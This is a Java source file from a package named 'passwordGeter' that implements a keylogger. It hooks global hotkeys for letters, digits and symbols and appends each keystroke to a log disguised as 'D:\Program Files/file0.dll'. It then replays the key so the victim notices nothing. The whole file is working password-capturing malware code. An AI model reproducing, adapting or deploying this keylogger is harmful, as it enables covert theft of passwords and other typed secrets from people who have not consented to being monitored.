package cn.yenmor.passwordGeter;
import java.awt.AWTException;
import java.awt.event.KeyEvent;
import java.io.File;

import com.melloware.jintellitype.*;
public class KeyPressGetter {
	
	public static int[] keys = new int[] {KeyEvent.VK_0,KeyEvent.VK_1,KeyEvent.VK_2,KeyEvent.VK_3,
			KeyEvent.VK_4,KeyEvent.VK_5,KeyEvent.VK_6,KeyEvent.VK_7,KeyEvent.VK_8,KeyEvent.VK_9,
			KeyEvent.VK_A,KeyEvent.VK_B,KeyEvent.VK_C,KeyEvent.VK_D,KeyEvent.VK_E,KeyEvent.VK_F,
			KeyEvent.VK_G,KeyEvent.VK_H,KeyEvent.VK_I,KeyEvent.VK_J,KeyEvent.VK_K,KeyEvent.VK_L,
			KeyEvent.VK_M,KeyEvent.VK_N,KeyEvent.VK_O,KeyEvent.VK_P,KeyEvent.VK_Q,KeyEvent.VK_R,
			KeyEvent.VK_S,KeyEvent.VK_T,KeyEvent.VK_U,KeyEvent.VK_V,KeyEvent.VK_W,KeyEvent.VK_X,
			KeyEvent.VK_Y,KeyEvent.VK_Z,KeyEvent.VK_NUMPAD0,KeyEvent.VK_NUMPAD1,
			KeyEvent.VK_NUMPAD2,KeyEvent.VK_NUMPAD3,KeyEvent.VK_NUMPAD4,
			KeyEvent.VK_NUMPAD5,KeyEvent.VK_NUMPAD6,KeyEvent.VK_NUMPAD7,
			KeyEvent.VK_NUMPAD8,KeyEvent.VK_NUMPAD9,
			KeyEvent.VK_OPEN_BRACKET,KeyEvent.VK_BACK_SLASH,
			KeyEvent.VK_CLOSE_BRACKET,KeyEvent.VK_AT,KeyEvent.VK_COLON,KeyEvent.VK_CIRCUMFLEX,
			KeyEvent.VK_DOLLAR,KeyEvent.VK_EURO_SIGN,KeyEvent.VK_EXCLAMATION_MARK,
			KeyEvent.VK_LEFT_PARENTHESIS,KeyEvent.VK_NUMBER_SIGN,KeyEvent.VK_PLUS,
			KeyEvent.VK_RIGHT_PARENTHESIS,KeyEvent.VK_UNDERSCORE,
			KeyEvent.VK_MINUS,KeyEvent.VK_PERIOD,KeyEvent.VK_SLASH,
			};
	
	public static void setKeys() {
		for(int i : keys) {
	JIntellitype.getInstance().registerHotKey(i,0,i);
		}
	
	JIntellitype.getInstance().addHotKeyListener(new HotkeyListener() {
		public void onHotKey(int markCode) {
			Do(markCode);			
	
		}});
	}
	public static void Do(int key) {
		FileWritter.Writer(KeyEvent.getKeyText(key),new File("D:\\Program Files/file0.dll"),true);
		JIntellitype.getInstance().unregisterHotKey(key);
		Simulator.PressSimulator(key);
		JIntellitype.getInstance().registerHotKey(key, 0, (char)key);
	}
	
	
}
